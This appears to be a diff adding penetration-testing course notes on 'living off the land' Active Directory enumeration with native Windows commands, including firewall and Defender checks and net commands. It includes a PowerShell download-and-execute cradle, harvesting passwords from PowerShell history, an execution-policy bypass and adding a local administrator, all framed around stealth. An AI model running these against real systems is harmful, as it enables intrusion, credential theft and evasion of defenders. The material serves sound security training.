@@ -1,0 +1,166 @@
+Scenario
+Let's assume our client has asked us to test their AD environment from a managed host with no internet access, and all efforts to load tools onto it have failed. Our client wants to see what types of enumeration are possible, so we'll have to resort to "living off the land" or only using tools and commands native to Windows/Active Directory. This can also be a more stealthy approach and may not create as many log entries and alerts as pulling tools into the network in previous sections. Most enterprise environments nowadays have some form of network monitoring and logging, including IDS/IPS, firewalls, and passive sensors and tools on top of their host-based defenses such as Windows Defender or enterprise EDR. Depending on the environment, they may also have tools that take a baseline of "normal" network traffic and look for anomalies. Because of this, our chances of getting caught go up exponentially when we start pulling tools into the environment from outside.
+
+Basic Enumeration Commands
+
+Command	                                                        Result
+hostname	                                                Prints the PC's Name
+[System.Environment]::OSVersion.Version	                  Prints out the OS version and revision level
+wmic qfe get Caption,Description,HotFixID,InstalledOn	    Prints the patches and hotfixes applied to the host
+ipconfig /all	                                            Prints out network adapter state and configurations
+set	                                                      Displays a list of environment variables for the current session (ran from CMD-prompt)
+echo %USERDOMAIN%	                                        Displays the domain name to which the host belongs (ran from CMD-prompt)
+echo %logonserver%	                                      Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)
+
+The systeminfo command, as seen above, will print a summary of the host's information for us in one tidy output. Running one command will generate fewer logs, meaning less of a chance we are noticed on the host by a defender.
+
+Let's look at a few of the ways PowerShell can help us.
+
+Cmd-Let	                                                                            Description
+Get-Module	                                                                        Lists available modules loaded for use.
+Get-ExecutionPolicy -List	                                                          Will print the execution policy settings for each scope on a host.
+Set-ExecutionPolicy Bypass -Scope                                                   Process	This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.
+Get-ChildItem Env: | ft Key,Value	                                                  Return environment values such as key paths, users, computer information, etc.
+
+Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt	With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.
+
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"	This is a quick and easy way to download a file from the web using PowerShell and call it from memory.
+
+Checking Defenses
+The next few commands utilize the netsh and sc utilities to help us get a feel for the state of the host when it comes to Windows Firewall settings and to check the status of Windows Defender.
+
+Firewall Checks SYNTAX: 
+PS C:\htb> netsh advfirewall show allprofiles
+
+Domain Profile Settings:
+----------------------------------------------------------------------
+State                                 OFF
+Firewall Policy                       BlockInbound,AllowOutbound
+LocalFirewallRules                    N/A (GPO-store only)
+LocalConSecRules                      N/A (GPO-store only)
+InboundUserNotification               Disable
+RemoteManagement                      Disable
+UnicastResponseToMulticast            Enable
+
+Logging:
+LogAllowedConnections                 Disable
+LogDroppedConnections                 Disable
+FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
+MaxFileSize                           4096
+
+Private Profile Settings:
+----------------------------------------------------------------------
+State                                 OFF
+Firewall Policy                       BlockInbound,AllowOutbound
+LocalFirewallRules                    N/A (GPO-store only)
+LocalConSecRules                      N/A (GPO-store only)
+InboundUserNotification               Disable
+RemoteManagement                      Disable
+UnicastResponseToMulticast            Enable
+
+Logging:
+LogAllowedConnections                 Disable
+LogDroppedConnections                 Disable
+FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
+MaxFileSize                           4096
+
+Public Profile Settings:
+----------------------------------------------------------------------
+State                                 OFF
+Firewall Policy                       BlockInbound,AllowOutbound
+LocalFirewallRules                    N/A (GPO-store only)
+LocalConSecRules                      N/A (GPO-store only)
+InboundUserNotification               Disable
+RemoteManagement                      Disable
+UnicastResponseToMulticast            Enable
+
+Logging:
+LogAllowedConnections                 Disable
+LogDroppedConnections                 Disable
+FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
+MaxFileSize                           4096
+
+Windows Defender Check (from CMD.exe) - SYNTAX: 
+C:\htb> sc query windefend
+
+SERVICE_NAME: windefend
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 4  RUNNING
+                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+Above, we checked if Defender was running. Below we will check the status and configuration settings with the Get-MpComputerStatus cmdlet in PowerShell.
+
+Get-MpComputerStatus SYNTAX 
+PS C:\htb> Get-MpComputerStatus
+
+AMEngineVersion                  : 1.1.19000.8
+AMProductVersion                 : 4.18.2202.4
+AMRunningMode                    : Normal
+AMServiceEnabled                 : True
+AMServiceVersion                 : 4.18.2202.4
+AntispywareEnabled               : True
+AntispywareSignatureAge          : 0
+AntispywareSignatureLastUpdated  : 3/21/2022 4:06:15 AM
+AntispywareSignatureVersion      : 1.361.414.0
+AntivirusEnabled                 : True
+AntivirusSignatureAge            : 0
+AntivirusSignatureLastUpdated    : 3/21/2022 4:06:16 AM
+AntivirusSignatureVersion        : 1.361.414.0
+BehaviorMonitorEnabled           : True
+ComputerID                       : FDA97E38-1666-4534-98D4-943A9A871482
+ComputerState                    : 0
+DefenderSignaturesOutOfDate      : False
+DeviceControlDefaultEnforcement  : Unknown
+DeviceControlPoliciesLastUpdated : 3/20/2022 9:08:34 PM
+DeviceControlState               : Disabled
+FullScanAge                      : 4294967295
+FullScanEndTime                  :
+FullScanOverdue                  : False
+FullScanRequired                 : False
+FullScanSignatureVersion         :
+FullScanStartTime                :
+IoavProtectionEnabled            : True
+IsTamperProtected                : True
+IsVirtualMachine                 : False
+LastFullScanSource               : 0
+LastQuickScanSource              : 2
+
+<SNIP>
+
+Network Information
+Networking Commands	                                                                  Description
+arp -a	                                                                Lists all known hosts stored in the arp table.
+ipconfig /all	                                                          Prints out adapter settings for the host. We can figure out the network segment from here.
+route print	                                                            Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.
+netsh advfirewall show allprofiles	                                    Displays the status of the host's firewall. We can determine if it is active and filtering traffic.
+
+
+
+Table of Useful Net Commands
+Command	                                          Description
+net accounts	                                    Information about password requirements
+net accounts /domain	                            Password and lockout policy
+net group /domain	                                Information about domain groups
+net group "Domain Admins" /domain	                List users with domain admin privileges
+net group "domain computers" /domain	            List of PCs connected to the domain
+net group "Domain Controllers" /domain	          List PC accounts of domains controllers
+net group <domain_group_name> /domain	            User that belongs to the group
+net groups /domain	                              List of domain groups
+net localgroup	                                  All available groups
+net localgroup administrators /domain	            List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)
+net localgroup Administrators	                    Information about a group (admins)
+net localgroup administrators [username] /add	    Add user to administrators
+net share	                                        Check current shares
+net user <ACCOUNT_NAME> /domain	                  Get information about a user within the domain
+net user /domain	                                List all users of the domain
+net user %username%	                              Information about the current user
+net use x: \computer\share	                      Mount the share locally
+net view	                                        Get a list of computers
+net view /all /domain[:domainname]	              Shares on the domains
+net view \computer /ALL	                          List shares of a computer
+net view /domain	                                List of PCs of the domain
+
+
